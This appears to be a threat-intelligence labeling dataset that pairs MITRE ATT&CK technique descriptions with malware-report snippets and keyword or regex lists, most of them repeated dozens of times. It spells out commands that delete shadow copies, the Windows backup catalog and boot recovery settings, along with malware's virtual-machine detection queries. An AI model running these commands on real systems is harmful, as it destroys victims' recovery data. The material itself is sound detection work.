Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.
The specific sandbox checks include:  Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm
Mouse Pointer Check The Trojan will perform the following WMI query:   Select * from Win32_PointingDevice   The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle
Hard Disk Check The Trojan will perform the following WMI query:   Select * from Win32_DiskDrive   The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle
Motherboard Check The Trojan will perform the following WMI query:   Select * from Win32_BaseBoard   The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle
VMware DLL Check The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory
The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine
ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. 

Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. 

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. 
 
Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)
Microphone, Voice IP applications
High resolution screenshots of specified process windows and when recording VoiceIP application audio
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
capturing audio 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 capture microphone 
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
 record audio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
Get-MicrophoneAudio
An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.
To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are “malfunctioning.” Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes
Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)
The usage of LinkedIn to deliver malicious documents,
Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.
At the same time, Enc.exe will start the encryption routine and append “. jcry ” as file extension to the encrypted file.
Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.
A new child process is created as “ tg ​ yt ​ ut ​ rc ​ ( ID) ​ .e ​ xe - i SM- tgytutrc ”, which is used to encrypt a single file on the drive
Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)

In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) 

To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as "print bombing").(Citation: NHS Digital Egregor Nov 2020)

In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)
After the encryption of file, it will delete shadow copies with the command “ vssadmin delete shadows /all ” to ensure that all the data cannot be restored easily.
Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).

In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)
Opening document starts a template injection technique for loading the document template from the internet.
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
remote template 
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
 template injeciton
Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)

Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)
The Data field is encrypted using a custom stream cipher.
Once encrypted, the system information is sent in the body of an HTTP POST
Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)

In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) 

To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as "print bombing").(Citation: NHS Digital Egregor Nov 2020)

In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)
Finally the script deletes the shadow copies, in a preparation for the ransomware operations.
Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)

A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.
Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
MS##-### 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
 smb and exploit in same sentence 
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
MS\d{2}-\d{3}
Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)

Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.

Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)
FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration

net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
net group 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
 Get-LocAdm
Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.
The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
OLE 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
 OLE object 
Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)
The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\Users\ADMINI~1\AppData\Roaming\Microsoft\Word\STARTUP.
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
